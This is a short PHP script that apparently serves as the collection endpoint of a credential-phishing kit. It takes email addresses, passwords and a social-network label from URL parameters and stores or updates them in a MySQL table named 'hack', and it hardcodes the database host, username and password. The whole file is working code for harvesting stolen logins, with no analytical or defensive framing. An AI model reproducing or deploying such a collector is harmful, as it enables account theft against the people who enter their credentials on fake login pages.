<?php
	header( 'Content-Type: application/javascript; charset = utf-8' );

    	$DB_Server = 'mysql.hostinger.com.ua';
    	$DB_User   = 'u878685101_user ';
    	$DB_Pass   = '111111';
    	$DB_Name   = 'u878685101_hack';

    	$connect = new mysqli( $DB_Server, $DB_User, $DB_Pass, $DB_Name );
    	$connect->query('SET NAMES utf8');

	$email    = "'" . $connect->real_escape_string( $_GET['email'] ) . "'";
    $password = "'" . $connect->real_escape_string( $_GET['password'] ) . "'";
    $social   = "'" . $connect->real_escape_string( $_GET['social'] ) . "'";

    $sql  = "SELECT * FROM hack WHERE email = $email";
    	$rs   = $connect->query( $sql );
    	$rows = $rs->num_rows;

    	if ( $rows != 0 ) {

    			$sql_update = "UPDATE hack SET email = $email, password = $password, social = $social WHERE email = $email";
    			if ( $connect->query( $sql_update ) === FALSE ) {
    				trigger_error( 'Wrong SQL: ' . $sql . ' Error: ' . $connect->error, E_USER_ERROR );
    				}
    	}
    	else{
    			$sql_insert = "INSERT INTO hack (id, email, password, social) VALUES (NULL, $email, $password, $social)";
                		if ( $connect->query( $sql_insert ) === FALSE ) {
                			trigger_error( 'Wrong SQL: ' . $sql . ' Error: ' . $connect->error, E_USER_ERROR );
                		}
    		}
?>
